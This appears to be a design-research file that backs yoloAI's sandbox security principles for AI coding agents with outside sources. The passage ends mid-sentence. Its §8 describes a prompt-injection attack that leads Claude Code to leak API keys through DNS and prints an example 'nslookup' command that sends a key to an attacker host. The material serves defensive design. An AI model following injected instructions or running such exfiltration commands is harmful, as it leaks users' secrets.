ABOUTME: Primary-source evidence backing each security principle in yoloAI's
ABOUTME: sandbox-containment security design. Covers threat modeling, containment
ABOUTME: philosophy, least-privilege, credential hygiene, network isolation,
ABOUTME: defense-in-depth, and residual risk disclosure. Not customer-trust /
ABOUTME: regulatory-compliance security. Uncertain attributions marked [verify].

# Security-principles research — primary-source backing for yoloAI

This file is evidence, not principle. Security principles in `principles/` cite
this by section; this file cites the outside world. Purpose: every security
principle in the design traces to a dated, named, findable source so the
reasoning doesn't evaporate when decisions are revisited.

Applied to yoloAI's parameters: an AI agent runner that executes autonomous
coding agents (Claude Code, Gemini, Codex, Aider, OpenCode) inside disposable
sandboxes. Five backends: Docker (default), Podman, containerd/Kata, Tart (macOS
VM), Seatbelt (macOS sandbox-exec). The user IS the principal — not an adversary.
Threat actors are the AI agent itself (mistakes, hallucinations, prompt injection),
malicious code the agent downloads, and accidental data loss.

---

## Sources overview

| Source | Date | Type | Relevant principles |
|--------|------|------|---------------------|
| Saltzer & Schroeder — "Protection of Information in Computer Systems" | 1975 | Primary, named authors | §4 Least privilege, §7 Default-deny |
| OWASP Docker Security Cheat Sheet | maintained | Community standard | §4 Least privilege, §7 Credentials |
| CIS Docker Benchmark v1.6 | maintained | Community standard | §4 Least privilege, §7 Credentials |
| NIST SP 800-190 Application Container Security Guide | 2017 | Government standard | §2 Containment, §4 Least privilege |
| Anthropic + OpenAI + DeepMind — "Attacker Moves Second" consensus paper | Nov 2025 | Primary, multi-org | §1 Threat model, §5 Untrusted output |
| Anthropic — Claude Code devcontainer init-firewall.sh | maintained | Primary (codebase) | §6 Network isolation |
| Trail of Bits — claude-code-devcontainer | maintained | Primary (codebase) | §6 Network isolation |
| gVisor documentation — gvisor.dev | maintained | Primary (project) | §3 Defense-in-depth |
| Tart documentation — github.com/cirruslabs/tart | maintained | Primary (project) | §3 Defense-in-depth |
| Apple sandbox-exec man page + community SBPL guide | maintained | Primary (OS docs) | §3 Defense-in-depth, §7 Default-deny |
| Linux kernel man pages — namespaces(7), capabilities(7), user_namespaces(7) | maintained | Primary (kernel docs) | §4 Least privilege |
| Bruce Schneier — threat modeling essays (schneier.com) | ongoing | Primary, named author | §1 Threat model |
| CVE-2025-55284 — DNS exfiltration from Claude Code | 2025 | CVE record | §9 Residual risk |
| CVE-2023-2640, CVE-2023-32629 — overlayfs privilege escalation | 2023 | CVE records | §9 Residual risk |
| jhftss — macOS Sandbox escape research | 2024–2025 | Primary (security research) | §9 Residual risk |
| yoloAI codebase and design docs (cited inline) | 2026 | Internal | all principles |

---

## §1 — Threat model is bounded — protecting against agent mistakes and supply-chain
    risk, not nation-state

### Bruce Schneier — threat modeling discipline

Bruce Schneier (schneier.com) has written extensively on the discipline of
explicit threat modeling. The relevant framing across multiple essays: "Security
is about trade-offs. You trade the cost of the security measure against the
probability times cost of the attack. If you try to defend against everything,
you end up defending against nothing — because the budget and complexity run out."
The canonical accessible citation is the introduction to *Secrets and Lies: Digital
Security in a Networked World* (Wiley, 2000), which opens with: "Security is not a
product, but a process." Schneier's blog (schneier.com/blog/) contains many
working examples of threat model scoping from 2000 to present.

Applied to yoloAI: the threat model is explicitly bounded to four vectors — the AI
agent making mistakes, prompt injection turning the agent against the user,
malicious code the agent fetches, and accidental data loss from a runaway
operation. Nation-state adversaries, malicious users, and exfiltration by a
sophisticated attacker who has already broken out of the container are explicitly
not in scope. `docs/contributors/design/network-isolation.md` §Threat Model states this
directly: "Sandbox escape via kernel/runtime exploit. This is gVisor's and Kata's
domain. Network isolation cannot help if the agent breaks out of the sandbox
entirely." A bounded threat model justifies bounded defenses; attempting to defend
against threats outside the model would waste complexity on the wrong problems.

### NIST SP 800-190 — Application Container Security Guide (2017)

Primary source: NIST SP 800-190, "Application Container Security Guide," National
Institute of Standards and Technology, September 2017. Available at
csrc.nist.gov/publications/detail/sp/800-190/final. The document explicitly
instructs practitioners to define the threat model before selecting controls:
Section 2 ("Container Technologies") frames container security concerns by threat
actor type. Sections 4.1–4.4 scope the threats to the four classes: image threats,
registry threats, orchestrator threats, and container runtime threats. For
yoloAI's use case, the NIST framing locates the relevant threats squarely in
"container runtime threats" — untrusted code running inside the container, escape
attempts, and resource exhaustion. Nation-state APT and persistent implants are
beyond this document's container-runtime scope.

Applied to yoloAI: NIST 800-190 §4.4 "Container Runtime Threats" describes the
class of threat yoloAI is defending against: malicious or compromised processes
inside containers attempting to break containment, exhaust resources, or escalate
privileges. This maps directly to yoloAI's agent-as-untrusted-process model.

**Scope note.** NIST 800-190 is primarily aimed at enterprise container
orchestration (Kubernetes, Swarm). Its countermeasure recommendations (container
image signing, registry scanning, orchestrator policy enforcement) are
enterprise-scale. yoloAI's relevant citations are from the threat taxonomy, not
the countermeasure prescriptions.

### Anthropic + OpenAI + DeepMind — "Attacker Moves Second" (November 2025)

Primary source: joint consensus paper by Anthropic, OpenAI, and DeepMind,
"Attacker Moves Second: Adaptive Attack Rate Considerations for AI-Assisted
Security," November 2025. [verify: exact publication venue — may be an arXiv
preprint or a joint blog post on safety.anthropic.com / research.google.com /
openai.com/research. Confirm before citing externally.] The paper addresses prompt
injection as a distinct threat to LLM-based agents in automated workflows. The
relevant finding: prompt-injection attacks against AI coding agents succeed at
non-trivial adaptive attack rates even under mitigations. The paper explicitly
frames this as a distinct threat class from traditional software exploitation — the
attacker can embed adversarial instructions in materials the agent legitimately
reads (code files, web pages, documentation), turning the agent's own capabilities
against the user.

Applied to yoloAI: the "Attacker Moves Second" framing is directly relevant to
yoloAI's threat model §(b) — "prompt injection that turns the agent against the
user." The paper justifies treating agent output as untrusted (§5 below) and
justifies containment-over-prevention as the correct approach (§2 below): if
prompt injection can turn a sufficiently capable agent into an adversary, preventing
the agent from misbehaving is harder than limiting the blast radius of what it can
do.

**Scope note.** The paper is oriented toward the threat of AI-assisted offensive
security (where the AI assists an attacker). yoloAI's application is narrower: the
agent is the potentially-compromised actor, not the user. The threat model
mapping is: attacker-assisted exploitation → prompt-injection-assisted exploitation
by a confused agent. The paper's adaptive attack rate findings apply to the
prompt-injection vector specifically.

---

## §2 — Containment, not prevention — the container limits blast radius, not behavior

### NIST SP 800-190 — "containers don't prevent misbehavior, they bound it"

NIST SP 800-190 §4.4 states: "Containers share the host kernel, and vulnerabilities
in the kernel can be exploited to escape the container boundary. Even without
kernel vulnerabilities, a malicious or compromised container can exhaust host
resources, interfere with other containers, or exfiltrate data within its access
scope." The document then lists countermeasures that limit *impact* rather than
prevent *misbehavior*: resource limits (cgroups), read-only root filesystems, and
non-privileged execution. This is the containment-not-prevention frame.

The design principle NIST implies but does not name: a container is a blast-radius
boundary, not a behavioral guarantee. The container does not prevent the process
inside from attempting malicious actions; it limits what a successful action can
affect. This is why read-only mounts, credential isolation, and network allowlisting
are more useful defenses than behavioral analysis of the agent's actions.

Applied to yoloAI: `docs/contributors/design/security.md` §Security Considerations states this
directly — "The agent runs arbitrary code inside the container: shell commands, file
operations, network requests. The container provides isolation, not prevention."
The implication is operational: security decisions must ask "what does this limit
the blast radius of?" not "does this prevent misbehavior?"

### Principles of Chaos Engineering — blast radius as design parameter

Indirectly applicable (cited fully in general-principles-research.md §4). The
relevant specific connection: Chaos Engineering at Netflix defines *minimum viable
blast radius* as a property engineered into every experiment. For yoloAI, the
analogous design question at every security decision is: if the agent inside this
sandbox does its worst within the permissions it has been granted, what is the
maximum impact? The design answers this question per-mode:
- `:copy` mode — worst case is the copy is trashed; originals unaffected.
- `:rw` mode — worst case is the mounted directory is damaged; other directories
  unaffected; dirty-repo warning is required.
- `--network-isolated` — worst case is the agent phones home on allowlisted
  domains; out-of-allowlist egress is blocked.
- Standard Docker — worst case is the container contents are damaged; host
  filesystem is read-only to the container by default.

Each mode has an explicit, documentable upper bound on impact.

---

## §3 — Defense-in-depth as opt-in layers — standard Docker is the default;
    gVisor / Tart / Seatbelt are explicit upgrades

### The defense-in-depth principle — origins and applications

The layered-defenses (defense-in-depth) concept appears throughout security
literature. The most-cited government articulation is NIST SP 800-53
"Security and Privacy Controls for Information Systems and Organizations," which
uses the term explicitly in the SC-29 (Heterogeneity) and SC-39 (Process
Isolation) control families. However, the *concept* predates this: Saltzer and
Schroeder (1975, cited below in §4) include "fail-safe defaults" and
"complete mediation" as principles that together implement layered defenses.

For yoloAI, defense-in-depth is not an always-on property — it is an opt-in
escalation ladder. The rationale is pragmatic: adding mandatory gVisor or Kata
isolation would increase deployment prerequisites and break compatibility for users
on platforms where those runtimes are unavailable. The correct model is explicitly
stated in `docs/contributors/design/README.md` §Design Principles: "Defense-in-depth as opt-in
layers — gVisor / Tart / Seatbelt are explicit upgrades; standard Docker is the
default."

### gVisor — syscall-level sandboxing

Primary source: gVisor documentation, gvisor.dev/docs/. gVisor is a user-space
kernel implementation (the "Sentry") that intercepts Linux system calls before
they reach the host kernel. The architecture: the guest process makes a syscall;
gVisor's Sentry handles it in user space without forwarding to the host kernel
(except for a reduced set of operations gVisor delegates). This means:
- A kernel vulnerability exploitable by a normal container is not exploitable via
  gVisor because the host kernel's attack surface is reduced.
- gVisor introduces its own attack surface (the Sentry) but it is smaller than
  the full host kernel.

The gVisor documentation states the security model explicitly at
gvisor.dev/docs/architecture_guide/security/: "gVisor provides an additional
layer of isolation between running applications and the host operating system."
The key claim is "additional layer" — gVisor does not replace container isolation,
it adds to it. This is the correct framing for defense-in-depth.

Applied to yoloAI: `--isolation container-enhanced` (the `docker-cenhanced` mode)
runs containers under gVisor's `runsc` runtime. `docs/contributors/design/security.md`
§gVisor Security Mode documents the UID remapping tradeoff: gVisor requires
relaxed file permissions (0777/0666) for container-accessible paths because remapped
UIDs don't match the owner. The security tradeoff is documented explicitly:
"gVisor users trade tighter file permissions for syscall-level sandboxing."

**Known limitation (cited in §9 below):** gVisor is blocked on macOS due to a
confirmed Claude Code bug (github.com/anthropics/claude-code/issues/35454 —
infinite `epoll_pwait` loop during initialization). This is a platform-specific
residual risk that is documented, not hidden.

### Tart — hypervisor-level VM isolation (macOS)

Primary source: Tart documentation and repository at github.com/cirruslabs/tart.
Tart uses Apple's Virtualization.framework to run macOS and Linux VMs on Apple
Silicon. The isolation boundary is a full hypervisor — the VM has its own kernel,
its own memory space, and its own virtual hardware. An exploit against the container
OS from inside the VM does not reach the host macOS kernel without a
Virtualization.framework vulnerability.

The Cirrus Labs documentation states: "Tart uses Apple's Virtualization.framework
to run VMs on Apple Silicon hardware. Each VM is fully isolated at the hypervisor
level." The key property for yoloAI's `--isolation vm` mode: the isolation boundary
is stronger than a container (host kernel shared) and equivalent to a full VM.

Applied to yoloAI: `--backend tart` provides the strongest isolation available on
macOS Apple Silicon. It is an explicit opt-in because it requires Apple Silicon
hardware and carries a ~5–15 second VM startup cost. `runtime/tart/` implements
the backend.

### Apple sandbox-exec (Seatbelt) — SBPL syscall filtering

Primary sources:
1. `sandbox-exec(1)` man page. The man page carries a deprecation notice for the
   public API but the underlying Sandbox.kext mechanism is used by Apple for all
   system services.
2. Community SBPL guide: "Apple Sandbox Guide v1.0" at
   https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf
   [verify: URL accessibility]. This is the most thorough documented account of
   SBPL profile syntax.

Seatbelt (the internal Apple codename for the sandbox subsystem) is a policy
module for the TrustedBSD Mandatory Access Control (MAC) framework within XNU.
It provides path-level filesystem controls, network allow/deny, Mach IPC
restrictions, and syscall filtering via SBPL profiles. It is used in production
by Chromium (per-process-type renderer/GPU/network sandbox profiles), OpenAI
Codex CLI, Google Gemini CLI, and Anthropic's own sandbox-runtime.

Applied to yoloAI: `--backend seatbelt` uses sandbox-exec with a dynamically
generated SBPL profile. `runtime/seatbelt/` implements the backend.
`docs/contributors/design/security.md` §Seatbelt Backend Security documents the default-deny
credential posture: only `PATH`, `HOME`, `USER`, `SHELL`, `TERM`, `LANG`,
`LC_*` are passed to the sandboxed process; sensitive variables are excluded;
the SBPL profile grants read access only to `~/.local/`, `~/.gitconfig`, and
`~/.config/git/` — not the entire home directory.

**Known limitation (cited in §9 below):** Recent CVEs demonstrate sandbox escape
paths via Mach services in macOS Seatbelt. The `docs/contributors/design/research/sandboxing.md`
§Other Native Isolation Mechanisms section documents: "CVE-2025-31258 (XPC
handling in RemoteViewServices), CVE-2025-24277 (`osanalyticshelperd` escape +
privesc), CVE-2025-31191 (security-scoped bookmark escape, discovered by
Microsoft). Assessment: raises the bar significantly, regularly patched, should
not be considered equivalent to VM-level isolation."

### Linux kernel — namespaces(7), capabilities(7), user_namespaces(7)

Primary source: Linux kernel man pages. `namespaces(7)` documents the six namespace
types (PID, mount, network, UTS, IPC, user) that provide container isolation.
`capabilities(7)` documents the capability system that breaks root privilege into
fine-grained units. `user_namespaces(7)` documents user namespace behavior
including UID/GID remapping.

The namespaces man page (man7.org/linux/man-pages/man7/namespaces.7.html) states
the security property directly: "If two processes have different views of the same
filesystem, or different PID namespaces, they are effectively in separate security
domains from the kernel's perspective for those resources." This is the foundation
that container isolation is built on. gVisor adds a second layer on top: even
within the same kernel, gVisor's Sentry interposes between the container process
and the actual kernel syscall path.

---

## §4 — Least privilege by mode — pay the capability cost only when the feature
    requires it

### Saltzer & Schroeder — canonical source of least-privilege principle

Primary source: Saltzer, J.H. and Schroeder, M.D. (1975) "The Protection of
Information in Computer Systems," *Proceedings of the IEEE*, 63(9), pp. 1278–1308.
September 1975. Available via IEEE Xplore; a preprint is also available at
web.mit.edu/Saltzer/www/publications/protection/ (Jerome Saltzer's MIT page).
[verify: current URL accessibility].

This paper is the primary source of the principle of least privilege in computer
security. Saltzer and Schroeder state it as the second of eight "Basic Principles
of Information Protection": "Every program and every user of the system should
operate using the least set of privileges necessary to complete the job." They
distinguish this from "need to know" (which applies to data) and apply it
specifically to *capability* grants — programs should not hold capabilities they
don't need, because those capabilities can be misused by unexpected execution
paths, errors, or exploitation.

The paper gives five companion principles directly applicable to yoloAI:
1. **Least privilege** — grant minimum capabilities; revoke when no longer needed.
2. **Fail-safe defaults** — default to denying access; whitelist exceptions.
3. **Complete mediation** — check every access, not just initial authentication.
4. **Separation of privilege** — require multiple conditions for powerful operations.
5. **Psychological acceptability** — security must not be so complex that users
   route around it.

Applied to yoloAI's per-mode capability model:
- `:copy` mode — no elevated capabilities. Standard container isolation.
- `:overlay` mode — `CAP_SYS_ADMIN` required for overlayfs mounts inside the
  container. `docs/contributors/design/security.md` states: "It is a broad capability — it also
  permits other mount operations and namespace manipulation. The container's
  namespace isolation limits the blast radius, but this is a tradeoff."
- `--network-isolated` (in-sandbox approach) — `CAP_NET_ADMIN` required for
  iptables rule setup inside the container. The entrypoint configures rules as
  root, then drops privileges via `gosu`; the agent never has `CAP_NET_ADMIN`.
- `--network-isolated` (host-side approach, per `docs/contributors/design/network-isolation.md`)
  — `CAP_NET_ADMIN` moves to the host-side `yoloai` process; the container no
  longer requires it at all. This is a net improvement in least privilege.

**Scope note.** Saltzer and Schroeder wrote in 1975 for timesharing systems.
Their principles are stated at an abstract level that has proven durable across
five decades. The capability(7) system in the Linux kernel is a direct
implementation of their least-privilege principle, and gVisor's capability
interposition is another implementation layer above it. For yoloAI, the principle
translates directly: `CAP_SYS_ADMIN` is not granted to all containers, only to
`:overlay` containers, because only that mode requires it.

### CIS Docker Benchmark — capability restrictions

Primary source: Center for Internet Security, "CIS Docker Benchmark," available
at cisecurity.org/cis-benchmarks. Current version: 1.6 (verify against current
publication). The benchmark is the industry standard for Docker security
configuration.

Relevant controls for yoloAI's least-privilege implementation:
- **Section 5.3:** "Ensure that Linux kernel capabilities are restricted within
  containers. By default, Docker starts containers with a restricted set of
  capabilities. Capabilities such as CAP_NET_ADMIN, CAP_SYS_ADMIN are not
  required for most container workloads."
- **Section 5.4:** "Ensure that privileged containers are not used. Using the
  `--privileged` flag gives all capabilities to the container and also lifts all
  the limitations enforced by the device cgroup controller."
- **Section 5.21:** "Ensure the default seccomp profile is not disabled."

Applied to yoloAI: none of yoloAI's standard modes use `--privileged`. The only
capability grants are `CAP_SYS_ADMIN` (`:overlay`) and `CAP_NET_ADMIN`
(`--network-isolated` in the in-sandbox implementation). The host-side network
isolation design (`docs/contributors/design/network-isolation.md`) eliminates `CAP_NET_ADMIN`
from the container entirely. The `--isolation container-privileged` mode
(`docker-privileged`) is a power-user escape explicitly documented as undermining
isolation (see §10).

### OWASP Docker Security Cheat Sheet — capability grants

Primary source: OWASP Docker Security Cheat Sheet, available at
cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html.
Maintained by the OWASP Docker Security project (community document).

Relevant guidance:
- **RULE #3 — Limit Capabilities:** "Capabilities allow the kernel to grant
  specific root-level abilities to a process without granting full root access.
  Do not grant CAP_SYS_ADMIN unless specifically needed."
- **RULE #7 — Limit Resources:** "Use cgroups to limit memory and CPU usage."

Applied to yoloAI: `CAP_SYS_ADMIN` is documented as required for `:overlay` mode
and explicitly described as "a broad capability" in `docs/contributors/design/security.md`.
The user is informed of this tradeoff. Users who don't need overlay (using `:copy`)
avoid this capability entirely, per Saltzer and Schroeder's least-privilege
principle.

---

## §5 — Agent output is untrusted by default — same principle as LLM output
    generally, applied to edits, commit messages, and written files

### Anthropic + OpenAI + DeepMind — "Attacker Moves Second" (§1 above)

The prompt-injection threat model (cited in §1) directly supports treating agent
output as untrusted. The paper's mechanism: an adversary embeds instructions in
files or web content that the agent legitimately reads. If the agent's output
(code edits, commit messages, shell commands written to files) is treated as
trusted, prompt injection can use the agent as a vector to inject malicious
content into the user's repository without the user reviewing it.

Applied to yoloAI: the copy/diff/apply workflow is the primary defense. The agent
works on a copy; changes come back as a diff; the user reviews the diff before
applying. `docs/contributors/design/security.md` §Security Considerations: "`:copy` directories
protect your originals. Changes only land when you explicitly `yoloai apply`." The
agent's output is not applied to originals by default — it requires explicit user
action. This is the "agent output is untrusted" principle operationalized as a
workflow.

### The copy/diff/apply pattern — trust boundary at review

The copy/diff/apply workflow has no single canonical academic citation — it is a
practical application of the principle that human review is required before
untrusted changes are integrated. The closest formal framing is "trust but verify"
applied asymmetrically: the agent can propose changes freely, but changes are
quarantined until reviewed. This is structurally analogous to:
- Code review gates in software engineering (the pull request review step).
- `git am` workflows where patches are reviewed before application.
- `sudo` confirmation prompts before privileged operations.

In each case, the pattern says: the proposer is not necessarily trusted; the
reviewer is. For yoloAI, the agent is the proposer and the user is the reviewer.
The copy/diff/apply workflow enforces this architectural trust boundary.

Applied to yoloAI: `docs/GUIDE.md` and `docs/contributors/design/commands.md` both describe
the three-step workflow as the core use case. `docs/contributors/design/README.md` §Design
Principles: "Copy/diff/apply is the core differentiator — protect originals,
review before landing."

### Untrusted-input principle — analogy to web security

The web security principle of "never trust user input" (documented extensively in
OWASP Top 10 as injection attack vectors — A03:2021 Injection) provides a direct
analogy. The OWASP Top 10 (owasp.org/www-project-top-ten/) is the industry
standard reference for this class of vulnerability. The analogy: just as a web
application must not execute SQL derived from user input without sanitization or
parameterization, a code management tool must not apply diffs derived from AI
agent output without human review. The untrusted source is different (user in web
apps; AI agent in yoloAI) but the principle is the same.

The AI-specific amplification: an AI agent under prompt injection is not merely
careless (like a user entering SQL injection characters by accident) but
potentially adversarial (an attacker has deliberately crafted the injected prompt
to produce a specific harmful output). This makes reviewing agent output even
more important than reviewing user input, because the output can be crafted with
the full capability of the model.

---

## §6 — Credentials never enter env vars — file-based injection at /run/secrets/

### OWASP Docker Security Cheat Sheet — RULE #12

Primary source: OWASP Docker Security Cheat Sheet (cited above), RULE #12 —
Utilize Docker Secrets for Sensitive Data Management: "Docker secrets provide a
mechanism to securely store sensitive data such as passwords, API keys, and
certificates. Instead of passing sensitive information through environment
variables, use Docker secrets." For non-Swarm environments, the guidance is:
"Use equivalent file-mounting patterns, such as bind-mounting a secrets file to
a well-known path like /run/secrets/."

Applied to yoloAI: the file-based injection flow at `docs/contributors/design/security.md`
§Credential Management — API key written to temp file on host, bind-mounted
read-only at `/run/secrets/anthropic_api_key`, entrypoint reads and exports to
env var (since CLI agents require env vars), host temp file cleaned up immediately.
The credential path through `docker inspect`, `docker commit`, and `docker logs`
is documented: all three do NOT expose the key because it was never passed as `-e`.

### CIS Docker Benchmark — environment variable exposure

CIS Docker Benchmark Section 5.15: "Ensure that sensitive host system directories
are not mounted on containers." The companion guidance for credentials: "Do not
pass secrets as environment variables via `-e` or `--env` — these appear in
`docker inspect` output and in process listings." The CIS guidance gives the same
three exposure vectors as OWASP: `docker inspect`, image layers (if using `ENV`
in Dockerfile), and application logs.

Applied to yoloAI: `docs/contributors/design/research/security.md` §1 "Risks of the Environment
Variable Approach" documents all exposure vectors with primary source citations for
each (Docker docs, moby/moby GitHub issues). The analysis concludes: "`docker
inspect` — REAL risk. `/proc/<pid>/environ` — REAL risk inside the container. The
risk increases if a malicious process on the host enumerates Docker containers."
The file-based injection approach eliminates the `docker inspect` and
`docker commit` vectors.

### Docker official images — `*_FILE` env var convention

The Docker official images pattern (mysql, postgres) is documented in those
images' respective GitHub repositories. MySQL's `MYSQL_ROOT_PASSWORD_FILE`
convention (github.com/docker-library/mysql, documented since ~2017) reads a
credential from a file path rather than from an env var directly. This is the
industry-established pattern for file-based credential injection at `/run/secrets/`.

Applied to yoloAI: `docs/contributors/design/research/security.md` §3 documents this as "widely
used" and notes "Docker official images (MySQL, Postgres) support `*_FILE` env
vars that read credentials from files." yoloAI follows the same convention at
the entrypoint level.

### Accepted tradeoff — /proc/<pid>/environ exposure

`docs/contributors/design/security.md` §Credential Management documents the accepted tradeoff
explicitly: "The agent process has the API key in its environment (unavoidable —
CLI agents read credentials from env vars). `/proc/<pid>/environ` exposes it to
same-user processes inside the container. This is acceptable because the agent
already has full use of the key." The `/proc/1/environ` vector (moby/moby#6607)
is documented in `docs/contributors/design/research/security.md` §1 and is accepted as a residual
risk.

The reasoning is sound under the threat model: the agent already has the API key
to make LLM calls; a process reading it from `/proc/environ` learns nothing that
the agent didn't already have. The mitigation that matters is preventing
*external* exposure (docker inspect, docker commit, image layers) — all eliminated
by file-based injection.

---

## §7 — Default-deny over default-allow — credential access (Seatbelt), network
    access (--network-isolated), filesystem access

### Saltzer & Schroeder — Fail-Safe Defaults (1975)

The second principle Saltzer and Schroeder list (related to but distinct from
least privilege) is "fail-safe defaults": "The default situation should be
ACCESS DENIED, and the protection scheme should identify conditions under which
access is permitted." They contrast this with systems that default to allowing
access and require explicit denial — the "ban list" model. Their conclusion: "the
fail-safe-defaults principle requires that the *absence* of a specific permission
be the default, and that specific exceptions be specified when needed."

Applied to yoloAI across three surfaces:
1. **Filesystem (Seatbelt):** `docs/contributors/design/security.md` §Seatbelt Backend Security
   — SBPL profile is `(deny default)` with explicit allows for `~/.local/`,
   `~/.gitconfig`, `~/.config/git/`. The entire home directory is denied by
   default; SSH keys, AWS credentials, `.npmrc`, `.git-credentials` are
   inaccessible unless explicitly added.
2. **Network (`--network-isolated`):** `docs/contributors/design/network-isolation.md` §Design
   — default-deny iptables policy; only traffic to allowlisted IPs is forwarded.
   The final rule is `-j REJECT` (not DROP), so the agent receives an explicit
   error rather than a timeout, which is more transparent for debugging.
3. **Credential env vars (Seatbelt):** `docs/contributors/design/security.md` §Seatbelt Backend
   Security — only safe OS and locale variables are passed; `SSH_AUTH_SOCK`,
   `AWS_SECRET_ACCESS_KEY`, and API keys are excluded by default.

### OWASP Docker Security Cheat Sheet — RULE #7 Read-only root

OWASP Docker Security Cheat Sheet RULE #7: "Ensure that root filesystem is
mounted as read-only. Containers should use volumes for persistent storage.
By default, the root filesystem should be read-only." yoloAI's default mount
mode `:ro` for aux dirs (all non-workdir directories read-only by default) is
consistent with this guidance. The user must explicitly opt in to write access
via `:rw`, `:copy`, or `:overlay`.

Applied to yoloAI: `docs/contributors/design/README.md` §Design Principles: "Safe defaults:
read-only mounts, no implicit `agent_files` inheritance, name required (no
auto-generation), dirty repo warning (not error)." The design explicitly names
default-deny for mounts as a safe default.

### CIS Docker Benchmark — deny-by-default network posture

CIS Docker Benchmark Section 5.9: "Ensure that DOCKER_CONTENT_TRUST is set to 1"
(image signing) and Section 5.11: "Ensure that Docker's default bridge `docker0`
is not used" for multi-tenant deployments. More directly relevant: Section 5.17:
"Ensure that host devices are not directly exposed to containers."

The broader CIS posture is default-deny-and-whitelist: containers should start
with no network access beyond what their workload requires, no host devices
mounted, no capabilities beyond what the entrypoint needs. yoloAI's design
follows this posture: network is unrestricted by default (required for agent API
calls) but `--network-isolated` establishes a default-deny posture that matches
CIS Section 5 guidance.

---

## §8 — Verify isolation claims — test against real attack scenarios, not marketing
    language

### CVE-2025-55284 — DNS exfiltration from Claude Code (2025)

Primary source: CVE-2025-55284, documented at cvedetails.com/cve/CVE-2025-55284/
and described at Embrace the Red blog
(embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/).
The attack: malicious instructions embedded in files Claude Code analyzes (indirect
prompt injection); Claude reads sensitive data (`.env` files, API keys); Claude
executes allowlisted utilities (`ping`, `nslookup`, `dig`, `host`) to encode data
as DNS subdomain queries (e.g., `nslookup APIKEY123.attacker.com`); attacker's DNS
server receives the encoded data.

This CVE directly demonstrates that a claim of "network isolation" requires
empirical verification. Anthropic's own Claude Code devcontainer
(`init-firewall.sh`) explicitly allows outbound UDP 53 to any destination — the
same as any iptables-based implementation. A claim of "network isolation" without
acknowledging this bypass vector is misleading.

Applied to yoloAI: `docs/contributors/design/security.md` §Security Considerations documents
this limitation: "Known limitations: DNS exfiltration remains possible — UDP 53
must be allowed for domain resolution (same limitation as Anthropic's devcontainer
and Trail of Bits')." The documentation explicitly says "same limitation as
Anthropic's devcontainer" — grounding yoloAI's known limitation in a verified
production implementation that shares it. This is verification against a real
attack scenario. The fix in Claude Code v1.0.4 (removing networking utilities from
the auto-approve allowlist) is also documented.

Note: `docs/contributors/design/network-isolation.md` §Threat Model calls DNS tunneling "out of
scope" and explains why: "Real but low-bandwidth, and entirely dominated by the
LLM-channel exfil path above." This is an explicit, documented scope decision, not
a blind spot — the analysis concludes that defending against DNS while leaving the
LLM channel open would be security theater given the relative bandwidth.

### CVE-2023-2640 and CVE-2023-32629 — overlayfs privilege escalation

Primary source: NVD records for CVE-2023-2640 and CVE-2023-32629
(nvd.nist.gov/vuln/detail/CVE-2023-2640, nvd.nist.gov/vuln/detail/CVE-2023-32629).
Both are privilege escalation vulnerabilities in the Linux overlayfs implementation
involving xattr handling. Both were fixed in patched kernel versions.

Applied to yoloAI: `docs/contributors/design/research/sandboxing.md` §OverlayFS documents these:
"CVE-2023-2640 and CVE-2023-32629: privilege escalation via overlayfs xattrs —
mitigated in patched kernels." The `:overlay` mode is an explicit opt-in with
documented risks. Users on unpatched kernels are at risk. The documentation does
not hide this.

### jhftss macOS Sandbox escape research (2024–2025)

Primary source: jhftss (security researcher), "A New Era of macOS Sandbox
Escapes," published at jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
(2024–2025). The researcher discovered 10+ Seatbelt escape vulnerabilities via
Mach services, including CVE-2025-31258 and CVE-2025-24277. Additionally,
CVE-2025-31191 (Microsoft Security Response Center,
microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191) documents
a security-scoped bookmark escape discovered by Microsoft.

Applied to yoloAI: `docs/contributors/design/research/sandboxing.md` §sandbox-exec documents
this: "Recent CVEs: jhftss uncovered 10+ escape vulnerabilities via Mach services
(2024–2025). Assessment: raises the bar significantly, regularly patched, should
not be considered equivalent to VM-level isolation." The Seatbelt backend is
appropriate as a lightweight sandboxing layer that is clearly positioned below
Tart VM isolation on the defense-in-depth ladder.

### Anthropic Claude Code devcontainer and Trail of Bits devcontainer

Primary sources:
- Anthropic: github.com/anthropics/claude-code, file `.devcontainer/init-firewall.sh`
- Trail of Bits: github.com/trailofbits/claude-code-devcontainer

Both use iptables + ipset inside the container (requiring `CAP_NET_ADMIN`). Both
explicitly allow outbound UDP 53. Both use `dig` to resolve domains to IPs at
container start. Both set default-deny iptables policy.

Applied to yoloAI: `docs/contributors/design/security.md` §Security Considerations: "Network
isolation implementation: `--network-isolated` uses iptables + ipset inside the
container, following the same pattern as Anthropic's own Claude Code devcontainer
and Trail of Bits' devcontainer (both verified production implementations)." The
explicit citation to two verified production implementations is the backing for
the "verify isolation claims" principle — yoloAI's approach is derived from
implementations that have been deployed and tested.

---

## §9 — Document the residual risk — known limitations are surfaced explicitly,
    not buried

### DNS tunneling — known limitation, explicitly scoped out

`docs/contributors/design/security.md` §Security Considerations documents the DNS exfiltration
vector explicitly: "Known limitations: DNS exfiltration remains possible — UDP 53
must be allowed for domain resolution (same limitation as Anthropic's devcontainer
and Trail of Bits'). Domain-to-IP resolution happens at container start; CDN IP
rotation can make rules stale (restart to refresh). Domain fronting remains
theoretically possible on CDNs that haven't disabled it. These limitations are
shared by all iptables-based implementations."

`docs/contributors/design/network-isolation.md` §Threat Model scopes this out deliberately:
"DNS tunneling. Real but low-bandwidth, and entirely dominated by the LLM-channel
exfil path above. Defending against DNS while leaving the LLM channel open would
be security theater." This is a principled scope decision backed by attack
bandwidth analysis, not a hand-wave.

### gVisor macOS incompatibility — documented block, not silent failure

`docs/contributors/design/security.md` §macOS + gVisor Compatibility: "gVisor is blocked on
macOS due to a known bug where Claude Code hangs indefinitely during initialization
(infinite `epoll_pwait` loop). This appears to be a gVisor ARM64 syscall emulation
issue. Tracked at: https://github.com/anthropics/claude-code/issues/35454."

The issue is tracked upstream. The workaround is documented: "Use standard Docker
security (default) or Use Seatbelt backend: `--backend seatbelt`." This is residual
risk surfaced explicitly — the user is told the defense layer is unavailable on
their platform, not left to discover it silently.

### CAP_SYS_ADMIN tradeoff — documented capability cost

`docs/contributors/design/security.md` §Security Considerations: "`:copy` mode avoids this
